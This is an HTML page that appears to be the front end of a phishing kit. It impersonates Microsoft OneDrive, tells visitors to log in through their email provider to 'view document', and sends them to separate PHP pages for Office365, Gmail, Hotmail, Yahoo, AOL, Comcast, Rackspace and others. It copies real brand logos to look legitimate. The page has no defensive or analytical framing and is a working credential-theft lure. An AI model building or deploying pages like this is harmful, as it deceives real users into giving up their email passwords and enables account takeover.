
<!DOCTYPE html>
<html lang="en-gb">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <title>Microsoft OneDrive</title>
    <link rel="stylesheet" href="assets/css/css_yXMMnLSSpPunfPzrxqTY5Fxi0thyZrjewLEjqduzimc.css" media="all">
    <link rel="stylesheet" href="assets/css/css_whE_FIKmCdJjmQukMY5DBbmkss9qZjXENYcyIcR-90c.css" media="all">
    <link rel="stylesheet" href="assets/css/css.css" media="all">
    <link rel="stylesheet" href="assets/css/css_7jDhC7Vm4-oxtUbtZMHwD8LA2Gp2KNpvOzvod9283FA.css" media="all">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="http://www.icons101.com/icons/9/Cloud_Services_Yosemite_Pack_by_mp03095/128/OneDrive.png" sizes="32x32">
    <link rel="icon" type="image/png" href="http://www.icons101.com/icons/9/Cloud_Services_Yosemite_Pack_by_mp03095/128/OneDrive.png" sizes="16x16">
    <link rel="mask-icon" href="assets/img/safari-pinned-tab.svg" color="#0061d5">
    <link rel="shortcut icon" href="http://www.icons101.com/icons/9/Cloud_Services_Yosemite_Pack_by_mp03095/128/OneDrive.png">
<style>
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 50%;
}

</style>
</head>
<body class="has-sticky-header page--home ad-banner-present masthead-present" style="display: none">
<div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
    <header id="site-header" class="site-header boxTopHeader-processed" role="banner" aria-label="Site-Header">
        <div class="container site-header--wrapper">
            
                <img style="width: 10%;" src="assets/img/oneDrive.png" alt="" class="center">
                               
            
            
        </div>
    </header>
    <main>
        <a id="main-content" tabindex="-1"></a>
        <div id="block-box-content">
            <div role="article" about="/en-gb/node/14601" class="centered masthead-bg picturefill-background" style="background-image: url('https://ow2.res.office365.com/owalanding/2020.4.15.02/images/security-large.jpg'); background-size: cover; background-position: 50% 100%; background-repeat: no-repeat;">

                <div class="masthead-bg-content" style="visibility: visible;">
                    <div class="container">
                        <h2>Choose your e-mail provider to login and view document in OneDrive</h2>
                        <div class="cta-in-row animated fadeInUp" style="visibility: visible;">
                            <a href="Office365.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://store-images.s-microsoft.com/image/apps.25144.13510798887489353.ba91417f-f0d9-447e-8437-1c100c23ade6.096b3123-c50e-4942-be9b-cb16e629d4de?w=180&h=180&q=60" alt="">
                                Office365
                            </a>
                            <a href="GMAIL.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1000px-Google_%22G%22_Logo.svg.png" alt="">
                                GMAIL
                            </a>
                            <a href="hot.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Outlook.com_icon.svg/2000px-Outlook.com_icon.svg.png" alt="">
                                Hotmail
                            </a>
                            <a href="yah.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://s.yimg.com/cv/apiv2/default/icons/favicon_y19_32x32_custom.svg" alt="">
                                Yahoo
                            </a>
                            <a href="Aol.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://vignette.wikia.nocookie.net/ladygaga/images/3/33/Aol.png/revision/latest?cb=20140228184407" alt="">
                                Aol
                            </a>
                            

                        </div>
                    </div>
<br>
               





                            <a href="comcast.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://cdn.comcast.com/learn/-/media/common/favicon/favicon-16x16.png" alt="">
                                Comcast
                            </a>&nbsp; &nbsp; &nbsp; &nbsp;
                            <a href="rak.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="https://login.rackspace.com/static/favicon.ico" alt="">
                                Rackspace
                            </a>&nbsp; &nbsp; &nbsp; &nbsp;
                            <a href="Other.php" class="btn-secondary">
                                <img style="width: 17px; padding-right: 5px;" src="http://pngimg.com/uploads/email/email_PNG20.png" alt="">
                                Other
                            </a>

</div>
                    </div>
                
            <div role="article" about="/en-gb/node/12841" class="grey-background flex-ls centered">
                <div class="container">
                    <ul class="flex-ls-list">
                        <li class="flex-ls-item">
                            
                        </li>
                        <li class="flex-ls-item">
                            <picture>
                                <!--[if IE 9]>
                                <![endif]--><img src="assets/img/cop.png" class="lazyautosizes lazyloaded" data-sizes="auto" sizes="135px">
                            </picture>
                        </li>
                        <li class="flex-ls-item">
                            <picture>
                                <!--[if IE 9]>
                                <![endif]--><img src="https://ol.azureedge.net/eas/p2/m2/L2-landing-page/ms-logo-footer@2x.png" class="lazyautosizes lazyloaded" data-sizes="auto" sizes="119px">
                            </picture>
                        </li>
                        <li class="flex-ls-item">
                            <a href="#">
                                <picture>
                                    <!--[if IE 9]>
                                    <![endif]--><img src="assets/img/term.png" alt="Pandora " class="lazyautosizes lazyloaded" data-sizes="auto" sizes="160px">
                                </picture>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </main>
</div>
</body>
</html>

